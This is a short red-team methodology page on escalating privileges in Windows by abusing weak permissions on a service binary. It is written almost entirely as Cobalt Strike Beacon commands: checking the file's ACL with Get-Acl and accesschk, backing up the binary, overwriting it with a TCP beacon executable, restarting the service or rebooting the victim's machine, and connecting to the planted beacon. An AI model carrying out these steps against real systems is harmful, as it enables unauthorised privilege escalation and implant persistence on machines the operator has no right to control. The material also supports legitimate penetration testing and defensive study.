---
title: "Weak Service Binary Permissions Abuse Methodology"
author: "nickvourd"
description: "Abuse Windows service binary misconfigurations that allow an attacker to elevate their privileges."
date: 2022-02-01
---

### Abuse Windows service binary misconfigurations that allow an attacker to elevate their privileges.

---

#### -> Get permisions of a service binary file (Beacon Command):
```powershell
$ powershell Get-Acl -Path "C:\[path]\[service_binary].exe" | fl
```

#### -> Find that the Users allow to Modify. This allows us to simply overwrite the binary with something else.

#### -> Take a backup of service binary (Beacon Command):
```powershell
$ download [service_binary].exe
```

#### -> Then upload the beacon-tcp.exe (Beacon Command):
```powershell
$ upload beacon-tcp.exe
```

#### -> If you take any error code from Cobalt Strike, use net helpmsg to resolve Windows error codes. Run the following comand on cmd of your machine (CMD Command):
```powershell
$ net helpmsg [error_code]
```

#### -> Find Service Permisions with accesschk from Sysinternals Suite (Beacon Command):
```powershell
$ powershell .\accesschk64.exe /accepteula -ucqv [user] [service_name]
```

#### -> If the service is running and you have permissions to stop it (Beacon Command):
```powershell
$ powershell sc.exe stop [service_name]
```

* Then start again the service (Beacon Command):
```powershell
$ powershell sc.exe start [service_name]
```

* Connect to the listening tcp beacon (Command Beacon):
```powershell
$ connect localhost [port]
```

#### -> If you don't have permissions to start/stop the victim's vulnerable service, just reboot the victim's machine and connect to TCP Beacon.

---

###### nickvourd's Social links
- [[GitHub]](https://github.com/nickvourd)
- [[Twitter]](https://twitter.com/nickvourd)